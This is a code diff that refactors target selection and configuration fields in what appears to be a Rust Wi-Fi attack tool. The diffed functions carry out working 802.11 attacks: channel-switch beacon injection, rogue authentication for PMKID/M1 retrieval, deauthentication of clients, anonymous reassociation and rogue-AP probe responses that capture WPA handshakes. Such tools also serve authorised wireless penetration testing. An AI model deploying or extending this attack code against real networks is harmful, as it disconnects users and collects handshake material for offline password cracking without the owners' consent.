@@ -45,29 +45,9 @@ pub fn csa_attack(oxide: &mut OxideRuntime, beacon: Beacon) -> Result<(), String
         return Ok(());
     };
 
-    ////// Target Validation ////////
-    let mut target: bool = true;
-
-    if !oxide.targets.is_empty() || !oxide.stargets.is_empty() {
-        target = false;
-    }
-
-    if !target && oxide.targets.contains(ap_mac) {
-        target = true;
-    }
-
-    if !target
-        && !oxide.stargets.is_empty()
-        && (ap_data.ssid.is_none()
-            || (ap_data.ssid.is_some() && oxide.stargets.contains(&ap_data.ssid.clone().unwrap())))
-    {
-        target = true
-    }
-
-    if !target {
+    if !oxide.target_data.targets.is_target(ap_data) {
         return Ok(());
     }
-    /////////////////////////////
 
     // If we already have a 4whs, don't continue.
     if oxide
@@ -85,12 +65,12 @@ pub fn csa_attack(oxide: &mut OxideRuntime, beacon: Beacon) -> Result<(), String
     let frx = build_csa_beacon(beacon.clone(), new_channel);
 
     // If we are transmitting
-    if !oxide.notx {
-        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
-        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
-        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
-        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
-        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+    if !oxide.config.notx {
+        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
+        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
+        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
+        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
+        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
         ap_data.interactions += 1;
         ap_data.auth_sequence.state = 1;
         oxide.status_log.add_message(StatusMessage::new(
@@ -127,29 +107,9 @@ pub fn m1_retrieval_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Res
         return Ok(());
     };
 
-    ////// Target Validation ////////
-    let mut target = true;
-
-    if !oxide.targets.is_empty() || !oxide.stargets.is_empty() {
-        target = false;
-    }
-
-    if !target && oxide.targets.contains(ap_mac) {
-        target = true;
-    }
-
-    if !target
-        && !oxide.stargets.is_empty()
-        && (ap_data.ssid.is_none()
-            || (ap_data.ssid.is_some() && oxide.stargets.contains(&ap_data.ssid.clone().unwrap())))
-    {
-        target = true
-    }
-
-    if !target {
+    if !oxide.target_data.targets.is_target(ap_data) {
         return Ok(());
     }
-    /////////////////////////////
 
     // If we already have a 4whs, don't continue.
     if oxide
@@ -187,12 +147,15 @@ pub fn m1_retrieval_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Res
 
     // Make an authentication frame (no_ack), so we don't over-send.
     // TODO: Probably add some sort of "noise" flag that uses ack (so we send retries when necessary)
-    let frx =
-        build_authentication_frame_noack(ap_mac, &oxide.rogue_client, oxide.counters.sequence2());
+    let frx = build_authentication_frame_noack(
+        ap_mac,
+        &oxide.target_data.rogue_client,
+        oxide.counters.sequence2(),
+    );
 
     // If we are transmitting
-    if !oxide.notx {
-        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+    if !oxide.config.notx {
+        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
         ap_data.interactions += 1;
         ap_data.auth_sequence.state = 1;
         ap_data.update_t1_timer();
@@ -215,29 +178,9 @@ pub fn m1_retrieval_attack_phase_2(
         return Ok(());
     };
 
-    ////// Target Validation ////////
-    let mut target = true;
-
-    if !oxide.targets.is_empty() || !oxide.stargets.is_empty() {
-        target = false;
-    }
-
-    if !target && oxide.targets.contains(ap_mac) {
-        target = true;
-    }
-
-    if !target
-        && !oxide.stargets.is_empty()
-        && (ap_data.ssid.is_none()
-            || (ap_data.ssid.is_some() && oxide.stargets.contains(&ap_data.ssid.clone().unwrap())))
-    {
-        target = true
-    }
-
-    if !target {
+    if !oxide.target_data.targets.is_target(ap_data) {
         return Ok(());
     }
-    /////////////////////////////
 
     // Is our sequence state 1?
     if ap_data.auth_sequence.state != 1 {
@@ -283,19 +226,19 @@ pub fn m1_retrieval_attack_phase_2(
         vec![cs],
     );
 
-    if !oxide.notx {
+    if !oxide.config.notx {
         ap_data.auth_sequence.state = 2;
         ap_data.update_t1_timer(); // We interacted
         ap_data.update_t2_timer(); // We changed state
 
-        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
         ap_data.interactions += 1;
     }
     Ok(())
 }
 
 pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<(), String> {
-    if !oxide.deauth {
+    if !oxide.config.deauth {
         return Ok(());
     }
 
@@ -305,25 +248,7 @@ pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<()
         return Ok(());
     };
 
-    let mut target = true;
-
-    if !oxide.targets.is_empty() || !oxide.stargets.is_empty() {
-        target = false;
-    }
-
-    if !target && oxide.targets.contains(ap_mac) {
-        target = true;
-    }
-
-    if !target
-        && !oxide.stargets.is_empty()
-        && (ap_data.ssid.is_none()
-            || (ap_data.ssid.is_some() && oxide.stargets.contains(&ap_data.ssid.clone().unwrap())))
-    {
-        target = true
-    }
-
-    if !target {
+    if !oxide.target_data.targets.is_target(ap_data) {
         return Ok(());
     }
 
@@ -334,7 +259,7 @@ pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<()
         return Ok(());
     }
 
-    if oxide.notx {
+    if oxide.config.notx {
         return Ok(());
     }
 
@@ -342,10 +267,6 @@ pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<()
     let mut deauth_client = MacAddress([255, 255, 255, 255, 255, 255]);
 
     if !ap_data.information.ap_mfp.is_some_and(|mfp| mfp) && ap_data.information.akm_mask() {
-        oxide.status_log.add_message(StatusMessage::new(
-            MessageType::Info,
-            format!("beacon_count % 128: {}", beacon_count % 128),
-        ));
         let random_client = ap_data
             .client_list
             .get_random()
@@ -361,7 +282,7 @@ pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<()
                 oxide.counters.sequence1(),
                 DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
             );
-            let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
 
             // Deauth From Client
             let frx = build_deauthentication_fm_client(
@@ -370,7 +291,7 @@ pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<()
                 oxide.counters.sequence1(),
                 DeauthenticationReason::DeauthenticatedBecauseSTAIsLeaving,
             );
-            let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
 
             ap_data.interactions += 1;
             oxide.status_log.add_message(StatusMessage::new(
@@ -387,7 +308,7 @@ pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<()
                     oxide.counters.sequence1(),
                     DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
                 );
-                let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+                let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
 
                 ap_data.interactions += 1;
                 oxide.status_log.add_message(StatusMessage::new(
@@ -421,7 +342,7 @@ pub fn anon_reassociation_attack(
     if oxide
         .handshake_storage
         .has_complete_handshake_for_ap(ap_mac)
-        || oxide.notx
+        || oxide.config.notx
     {
         return Ok(());
     }
@@ -432,29 +353,9 @@ pub fn anon_reassociation_attack(
         return Ok(());
     };
 
-    ////// Target Validation ////////
-    let mut target = true;
-
-    if !oxide.targets.is_empty() || !oxide.stargets.is_empty() {
-        target = false;
-    }
-
-    if !target && oxide.targets.contains(ap_mac) {
-        target = true;
-    }
-
-    if !target
-        && !oxide.stargets.is_empty()
-        && (ap.ssid.is_none()
-            || (ap.ssid.is_some() && oxide.stargets.contains(&ap.ssid.clone().unwrap())))
-    {
-        target = true
-    }
-
-    if !target {
+    if !oxide.target_data.targets.is_target(ap) {
         return Ok(());
     }
-    /////////////////////////////
 
     let pcs = if ap.information.cs_ccmp.is_some_and(|x| x) {
         RsnCipherSuite::CCMP
@@ -481,7 +382,7 @@ pub fn anon_reassociation_attack(
         gcs,
         vec![pcs],
     );
-    let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+    let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
 
     ap.interactions += 1;
     oxide.status_log.add_message(StatusMessage::new(
@@ -510,7 +411,7 @@ pub fn rogue_m2_attack_directed(
     probe: ProbeRequest,
 ) -> Result<(), String> {
     // make sure TX is enabled
-    if oxide.notx {
+    if oxide.config.notx {
         return Ok(());
     }
 
@@ -529,29 +430,6 @@ pub fn rogue_m2_attack_directed(
 
     let ap = oxide.access_points.get_device_by_ssid(&ssid);
 
-    ////// Target Validation ////////
-    let mut target = true;
-
-    if !oxide.targets.is_empty() || !oxide.stargets.is_empty() {
-        target = false;
-    }
-
-    if !target
-        && !oxide.targets.is_empty()
-        && ap.is_some_and(|ap| oxide.targets.contains(&ap.mac_address))
-    {
-        target = true;
-    }
-
-    if !target && !oxide.stargets.is_empty() && (oxide.stargets.contains(&ssid)) {
-        target = true
-    }
-
-    if !target {
-        return Ok(());
-    }
-    /////////////////////////////
-
     if station.timer_interact.elapsed().unwrap() < Duration::from_secs(3) {
         return Ok(());
     }
@@ -559,11 +437,11 @@ pub fn rogue_m2_attack_directed(
     // If we have an AP for this SSID, we will use as many of the same details as possible
     if let Some(ap) = oxide.access_points.get_device_by_ssid(&ssid) {
         // Make sure this AP is a target and that this AP is
-        if (!oxide.targets.is_empty() && !oxide.targets.contains(&ap.mac_address))
+        if !oxide.target_data.targets.is_target(ap)
             || oxide
                 .handshake_storage
                 .has_complete_handshake_for_ap(&ap.mac_address)
-            || oxide.notx
+            || oxide.config.notx
         {
             return Ok(());
         }
@@ -573,18 +451,16 @@ pub fn rogue_m2_attack_directed(
             &probe.header.address_1,
             &ssid,
             oxide.counters.sequence3(),
-            oxide.current_channel.get_channel_number(),
+            oxide.if_hardware.current_channel.get_channel_number(),
         );
-        write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
+        write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx)?;
         station.interactions += 1;
         station.timer_interact = SystemTime::now();
         oxide.status_log.add_message(StatusMessage::new(
             MessageType::Info,
             format!("Direct Rogue AP Attack: {} ({})", station.mac_address, ssid),
         ));
-    } else {
-        return Ok(());
-    };
+    }
 
     Ok(())
 }
@@ -595,7 +471,7 @@ pub fn rogue_m2_attack_undirected(
     probe: ProbeRequest,
 ) -> Result<(), String> {
     // make sure TX is enabled
-    if oxide.notx {
+    if oxide.config.notx {
         return Ok(());
     }
 
@@ -612,30 +488,7 @@ pub fn rogue_m2_attack_undirected(
     }
 
     if let Some(ssid) = probe.station_info.ssid {
-        // Target validation stuff
-        let mut is_target = true;
-
-        if !oxide.targets.is_empty() || !oxide.stargets.is_empty() {
-            is_target = false;
-        }
-
-        // Is the AP the SSID belongs to (based on our survey) in our MAC Targets?
-        if !is_target
-            && oxide
-                .access_points
-                .get_device_by_ssid(&ssid)
-                .is_some_and(|ap| oxide.targets.contains(&ap.mac_address))
-        {
-            is_target = true;
-        }
-
-        // Is the SSID in our stargets?
-        if !is_target && oxide.stargets.contains(&ssid) {
-            is_target = true;
-        }
-
-        // Both checks fail, we shouldn't persue this.
-        if !is_target {
+        if !oxide.target_data.targets.is_target_ssid(&ssid) {
             return Ok(());
         }
 
@@ -646,12 +499,12 @@ pub fn rogue_m2_attack_undirected(
 
         let frx = build_probe_response(
             &probe.header.address_2,
-            &oxide.rogue_client,
+            &oxide.target_data.rogue_client,
             &ssid,
             oxide.counters.sequence3(),
-            oxide.current_channel.get_channel_number(),
+            oxide.if_hardware.current_channel.get_channel_number(),
         );
-        write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
+        write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx)?;
         station.interactions += 1;
         station.timer_interact = SystemTime::now();
         oxide.status_log.add_message(StatusMessage::new(
@@ -663,21 +516,19 @@ pub fn rogue_m2_attack_undirected(
         ));
     } else {
         // We don't want to nest this...
-        if !oxide.stargets.is_empty() {
+        if oxide.target_data.targets.has_ssid() {
             // Pick a random SSID from our targets and respond.
-            let target = &oxide
-                .stargets
-                .choose(&mut rand::thread_rng())
-                .unwrap_or(return Ok(()));
+            let target = oxide.target_data.targets.get_random_ssid().unwrap();
 
             let frx = build_probe_response(
                 &probe.header.address_2,
-                &oxide.rogue_client,
-                target,
+                &oxide.target_data.rogue_client,
+                &target,
                 oxide.counters.sequence3(),
-                oxide.current_channel.get_channel_number(),
+                oxide.if_hardware.current_channel.get_channel_number(),
             );
-            write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
+            write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx)?;
+
             station.interactions += 1;
             station.timer_interact = SystemTime::now();
             oxide.status_log.add_message(StatusMessage::new(
